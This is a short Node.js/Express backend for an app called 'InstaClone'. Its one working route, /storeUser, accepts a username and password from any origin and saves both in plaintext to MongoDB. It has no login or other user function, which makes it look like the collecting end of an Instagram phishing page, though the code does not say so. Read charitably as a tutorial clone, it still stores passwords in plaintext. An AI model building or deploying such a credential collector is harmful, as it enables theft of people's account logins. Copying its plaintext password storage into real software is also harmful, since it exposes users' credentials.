require("dotenv").config();
const express = require("express");
const { MongoClient } = require("mongodb");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();

// Middleware
app.use(cors({ origin: "*" })); // or restrict to your frontend: origin: "https://instaclone-frontend.vercel.app"
app.use(bodyParser.json());

// MongoDB connection
const client = new MongoClient(process.env.MONGO_URI);
let db;

async function connectDB() {
  try {
    await client.connect();
    db = client.db("insta_app_db"); // ✅ your new database name
    console.log("✅ Connected to MongoDB");
  } catch (err) {
    console.error("❌ DB connection error:", err);
  }
}
connectDB();

// ✅ Root route (so Vercel doesn't show "Cannot GET /")
app.get("/", (req, res) => {
  res.send("🚀 InstaClone Backend is Live!");
});

// ✅ Store user route
app.post("/storeUser", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password)
    return res.status(400).json({ message: "Missing username or password" });

  try {
    await db.collection("users").insertOne({
      username,
      password,
      createdAt: new Date(),
    });
    console.log("📦 Data saved:", username);
    res.json({ message: "✅ User data saved successfully!" });
  } catch (err) {
    console.error("❌ Error saving data:", err);
    res.status(500).json({ message: "Error saving data" });
  }
});

// ✅ Export for Vercel (no app.listen)
module.exports = app;
